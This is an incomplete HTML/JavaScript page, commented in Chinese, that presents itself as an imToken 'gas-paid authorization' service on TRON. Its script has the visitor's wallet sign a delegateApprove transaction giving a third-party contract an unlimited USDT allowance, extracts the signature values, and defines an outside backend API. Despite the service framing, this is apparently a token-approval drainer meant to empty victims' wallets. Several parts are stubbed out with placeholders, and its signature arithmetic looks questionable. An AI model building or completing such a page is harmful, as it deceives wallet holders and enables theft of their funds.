<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imToken代付授权服务</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
        /* 样式与之前保持一致，省略重复部分 */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            padding: 15px 12px; 
            max-width: 600px; 
            margin: 0 auto; 
            background: #121a17; 
            color: #e0e8e4; 
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            gap: 8px; 
            border-radius: 8px;
            border-left: 3px solid #3b82f6;
        }
        /* 其他样式保持不变 */
    </style>
</head>
<body>
    <!-- HTML结构与之前保持一致，省略重复部分 -->
    <div class="container">
        <div class="header">   
            <div>
                <h1>imToken代付授权</h1>
                <p class="desc">代付合约专属服务：矿工费由部署者承担，每个钱包地址仅可授权1次</p>
            </div>
        </div>   
        <!-- 其他HTML元素保持不变 -->
    </div>

    <script>
        const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk";
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const BACKEND_API = "https://imtoken-dusky.vercel.app/api";
        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
        const TRON_CHAIN_ID = 1; // TRON主网链ID
        let tronWeb, userAddress, trxTimer;
        // 其他常量定义保持不变

        window.onload = async () => {
            // 初始化逻辑与之前保持一致，省略重复部分
            // 核心修改集中在generateOfflineSignature函数
        };

        // 地址清理函数保持不变
        function cleanBase58Address(address) {
            if (!address) throw new Error("地址不能为空");
            const cleanAddr = address.trim().replace(/[\s\u200B-\u200D\uFEFF]/g, '');
            const base58Regex = /^[A-Za-z0-9]{34}$/;
            if (!base58Regex.test(cleanAddr)) {
                throw new Error(`无效的Base58地址（长度${cleanAddr.length}位，需34位字母数字）`);
            }
            return cleanAddr;
        }

        /**
         * 生成符合TRON委托交易规范的签名（核心修复）
         * 签名对象：完整的delegateApprove交易结构（包含元数据）
         */
        async function generateOfflineSignature(userAddress, contractAddress, amount) {
            try {
                const cleanUserAddr = cleanBase58Address(userAddress);
                const cleanContractAddr = cleanBase58Address(contractAddress);
                
                // 1. 构建完整的delegateApprove交易对象（TRON委托交易核心）
                const tx = await tronWeb.transactionBuilder.triggerSmartContract(
                    cleanContractAddr, // 代付合约地址
                    "delegateApprove(address,address,uint256)", // 合约方法签名
                    {
                        feeLimit: 100000000, // 手续费上限（TRON要求）
                        callValue: 0, // 转账金额（0，仅授权）
                        shouldPollResponse: false
                    },
                    [
                        // 方法参数（严格匹配合约定义）
                        { type: "address", value: cleanUserAddr }, // 用户地址
                        { type: "address", value: USDT_CONTRACT }, // USDT合约地址
                        { type: "uint256", value: amount } // 授权金额（无限额度）
                    ],
                    cleanUserAddr, // 签名者地址
                    TRON_CHAIN_ID // 链ID（TRON主网为1）
                );

                // 校验交易构建结果
                if (!tx || !tx.transaction) {
                    throw new Error(`交易对象构建失败：${JSON.stringify(tx, null, 2)}`);
                }
                if (tx.result && tx.result.code !== "SUCCESS") {
                    throw new Error(`合约方法调用失败：${tx.result.message || '未知错误'}`);
                }

                // 2. 对完整交易对象签名（而非哈希）
                let signedTx = await tronWeb.trx.sign(tx.transaction);
                // 兼容imToken的签名返回格式（可能包含tx.result或signature字段）
                if (typeof signedTx === "object") {
                    if (signedTx.tx && signedTx.tx.signature) {
                        signedTx = signedTx.tx; // 提取交易对象
                    } else if (signedTx.signature) {
                        // 直接包含签名数组
                    } else {
                        throw new Error("imToken返回的签名结构不支持");
                    }
                }

                // 3. 提取签名信息（TRON规范：signature为数组，包含130位十六进制字符串）
                if (!signedTx.signature || signedTx.signature.length === 0) {
                    throw new Error("imToken未返回有效签名");
                }
                const signature = signedTx.signature[0].replace(/^0x/, ""); // 取第一个签名
                if (signature.length !== 130) {
                    throw new Error(`签名长度错误（需130位，实际${signature.length}位）`);
                }

                // 4. 解析V/R/S（符合TRON链ID规范）
                const rRaw = signature.slice(0, 64); // 前64位为r
                const sRaw = signature.slice(64, 128); // 中间64位为s
                const rawV = parseInt(signature.slice(128, 130), 16); // 最后2位为rawV
                // TRON规范：v = rawV + 27 + 8 * 链ID（确保合约验证时包含链ID信息）
                const v = rawV + 27 + 8 * TRON_CHAIN_ID;

                // 校验V/R/S格式
                if (v < 31 || v > 34) { // 链ID=1时，v应在31-34之间
                    throw new Error(`V值不符合TRON规范（当前${v}，需31-34）`);
                }
                if (rRaw.length !== 64 || sRaw.length !== 64) {
                    throw new Error("R/S值长度错误（需64位）");
                }
                const r = `0x${rRaw}`;
                const s = `0x${sRaw}`;

                // 保存调试信息（便于校验交易结构与签名）
                localStorage.setItem(`signature_debug_${cleanUserAddr}`, JSON.stringify({
                    step: "TRON委托交易签名生成成功",
                    transaction: tx.transaction, // 原始交易对象
                    signedTransaction: signedTx, // 签名后的交易
                    v: v,
                    r: r,
                    s: s,
                    chainId: TRON_CHAIN_ID,
                    timestamp: new Date().toISOString()
                }, null, 2));

                showToast(`签名生成成功（v=${v}，符合TRON委托交易规范）`);
                return { v, r, s };
            } catch (e) {
                const debugKey = `signature_debug_${userAddress || 'unknown'}`;
                localStorage.setItem(debugKey, JSON.stringify({
                    step: "签名生成失败",
                    error: e.message,
                    timestamp: new Date().toISOString()
                }, null, 2));
                throw new Error(`生成失败：${e.message} → 点击「查看调试信息」查看详情`);
            }
        }

        // 其他函数（initWallet、startPersistentTrxCountdown等）保持不变
        async function initWallet() { /* ... */ }
        function startPersistentTrxCountdown() { /* ... */ }
        // ... 其他工具函数
    </script>
</body>
</html>
